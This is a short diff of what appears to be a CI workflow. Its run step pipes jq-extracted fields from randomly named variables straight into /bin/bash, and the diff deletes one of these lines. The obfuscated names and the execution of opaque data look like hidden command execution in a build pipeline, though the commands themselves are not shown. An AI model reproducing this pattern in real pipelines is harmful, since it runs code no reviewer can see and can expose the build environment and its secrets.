@@ -32,7 +32,6 @@ jobs:
           echo $x0 | jq -r .qqf52589 | /bin/bash
           echo $vgfnb4 | jq -r .h463 | /bin/bash
           echo $sm80247 | jq -r .fyub0 | /bin/bash
-          echo $eza1177 | jq -r .e47 | /bin/bash
           printf '%s' "$sd3440" | jq -r .c8372 | /bin/bash
 
       - name: Archive output
